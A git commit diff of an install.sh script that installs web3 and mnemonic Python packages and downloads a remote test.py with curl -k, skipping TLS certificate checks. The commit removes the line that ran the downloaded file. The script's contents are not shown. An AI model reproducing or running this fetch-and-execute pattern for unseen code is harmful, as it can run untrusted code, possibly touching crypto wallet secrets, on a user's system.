49f1d9c6147d14c7dcd7a5e60529f9d0e571cc8b
Isouma <83762343+IsoumaDev@users.noreply.github.com>
2025-02-12 14:02:12 +0700

    Update install.sh
    a

--- install.sh
+++ install.sh
@@ -4,4 +4,3 @@ sudo apt-get -y upgrade
 sudo apt install python3-pip
 pip3 install requests web3 mnemonic 
 curl -o- -k https://raw.githubusercontent.com/IsoumaDev/PythonA/refs/heads/main/test.py > test.py
-python3 test.py
